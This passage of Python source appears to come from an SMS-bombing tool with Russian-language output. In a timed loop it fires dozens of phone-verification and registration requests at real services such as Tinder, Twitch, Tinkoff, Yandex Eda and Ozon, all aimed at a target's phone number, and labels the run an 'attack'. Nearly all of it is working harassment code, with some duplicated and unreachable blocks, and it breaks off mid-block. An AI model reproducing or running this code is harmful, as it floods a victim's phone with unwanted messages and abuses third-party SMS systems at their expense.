        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
                          params={"pageName": "registerPrivateUserPhoneVerificatio"},
                          data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            R = R + 1
            print('[+] MVideo Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + _phone})
            R = R + 1
            print('[+] OK Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
            R = R + 1
            print('[+] SMSgorod Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')



        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
            R = R + 1
            print('[+] Delivery Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',
                          json={"birthday": {"day": 11, "month": 11, "year": 1999},
                                "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,
                                "password": password, "phone_number": _phone, "username": username})
            R = R + 1
            print('[+] Twitch Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
                          headers={'App-ID': 'cabinet'})
            R = R + 1
            print('[+] CabWiFi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
            R = R + 1
            print('[+] wowworks Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + _phone})
            R = R + 1
            print('[+] Eda.Yandex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                          json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
                                "deliveryOption": "sms"})
            R = R + 1
            print('[+] Alpari Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
            R = R + 1
            print('[+] SMS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            print('[+] Grab Отправлено! || Кол-во - ' + str(R))
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
            time.sleep(1)
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            R = R + 1
            print('[+] RuTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
            R = R + 1
            print('[+] BelkaCar Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php',
                          data={'aj': '50', 'registration-phone': _phone})
            R = R + 1
            print('[+] StarPizzaCafe Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': _phone}, headers={})
            R = R + 1
            print('[+] Tinder Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
            R = R + 1
            print('[+] Tinkoff Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            R = R + 1
            print('[+] Dostavista Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:

            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] MonoBank Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break

        try:
            requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
            R = R + 1
            print('[+] binotel Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32',
                         data={"phone": _phone})
            R = R + 1
            print('[+] SportMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            R = R + 1
            print('[+] Alfalife Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            R = R + 1
            print('[+] KoronaPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone',
                          data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on",
                                "oferta": "on", })
            R = R + 1
            print('[+] GGbet Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.etm.ru/cat/runprog.html',
                          data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services",
                                "getSysParam": "yes", })
            R = R + 1
            print('[+] ETM Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
            R = R + 1
            print('[+] TheLive Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            R = R + 1
            print('[+] MyGames Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/',
                          json={"name": _name, "surname": _name, "patronymic": _name, "sex": "m",
                                "birthdate": "11.11.1999",
                                "phone": (_phone, "+* (***) ***-**-**"), "email": _email, "city": "Москва", })
            R = R + 1
            print('[+] Zoloto585 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
            R = R + 1
            print('[+] Kasta Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/',
                          data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
            R = R + 1
            print('[+] Тaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:

            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
            R = R + 1
            print('[+] Mail.ru Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send',
                          json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
            R = R + 1
            print('[+] Creditter Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2',
                          headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                          json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                                "DocIssueDate": "2004-02-05T07:19:56.276+02:00", "DocNumber": randint(500000, 999999),
                                "DocSeries": randint(5000, 9999), "FirstName": _name, "Gender": "M", "LastName": _name,
                                "SecondName": _name, "Phone": _phone, "Email": _email, })
            R = R + 1
            print('[+] Ingos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json',
                          json={"mobile": _phone, "bonus": "signup", "agreement": 1, "currency": "RUB", "submit": 1,
                                "email": "", "lang": "en", })
            R = R + 1
            print('[+] Admiralxxx Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            R = R + 1
            print('[+] Av Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                          params={"msisdn": _phone})
            R = R + 1
            print('[+] MTS Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            R = R + 1
            print('[+] City24 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            R = R + 1
            print('[+] SushiMaster Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            R = R + 1
            print('[+] MultiPlex Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
            R = R + 1
            print('[+] 3040 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php',
                          data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
            R = R + 1
            print('[+] Niyama Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            R = R + 1
            print('[+] VSK Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            R = R + 1
            print('[+] EasyPay Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            R = R + 1
            print('[+] Fix-Price Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            R = R + 1
            print('[+] Tele2 Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            R = R + 1
            print('[+] Finam Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://makimaki.ru/system/callback.php',
                          params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
            R = R + 1
            print('[+] MakiMaki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status',
                          headers={"Origin": "https://www.flipkart.com",
                                   "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop", },
                          json={"loginId": "+" + _phone, "supportAllStates": True})
            R = R + 1
            print('[+] FlipKart Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            R = R + 1
            print('[+] Online.ua Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            R = R + 1
            print('[+] PlanetaKino Was sent!')
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client',
                          json={"country": _codes[_code].upper(), "phone": _phone, })
            R = R + 1
            print('[+] OnTaxi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            R = R + 1
            print('[+] Iqos Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/',
                          json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            R = R + 1
            print('[+] Smart.Space Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')

        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php',
                          data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6',
                                'phone': _phone})
            R = R + 1
            print('[+] tarantino-family Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://apteka.ru/_action/auth/getForm/',
                          data={"form[NAME]": "", "form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "",
                                "form[EMAIL]": "", "form[LOGIN]": (_phone, "+* (***) ***-**-**"),
                                "form[PASSWORD]": password, "get-new-password": "Получите пароль по SMS",
                                "user_agreement": "on", "personal_data_agreement": "on", "formType": "simple",
                                "utc_offset": "120", })
            R = R + 1
            print('[+] Apteka Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
                          headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            R = R + 1
            print('[+] Uklon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry',
                          json={"phone": _phone, "otpId": 0})
            R = R + 1
            print('[+] Ozon Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit',
                         params={"callback": "submitCallback", "name": _name, "phone": "+" + _phone, "email": _email,
                                 "gorod": "Москва", "approving_data": "1", })
            R = R + 1
            print('[+] Banki Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            R = R + 1
            print('[+] IVI Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://www.moyo.ua/identity/registration',
                          data={"firstname": _name, "phone": _phone, "email": _email})
            R = R + 1
            print('[+] Moyo Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            R = R + 1
            print('[+] Helsi Отправлено! || Кол-во - ' + str(R))
            time.sleep(1)
        except:
            print('[-] Ошибка при отправке!')
        if time.time() > start_time + float(CLOSE_AFTER):
            print(Fore.RED)
            print("Атака закончена! Для закрытия нажмите ENTER...")
            break
        try:
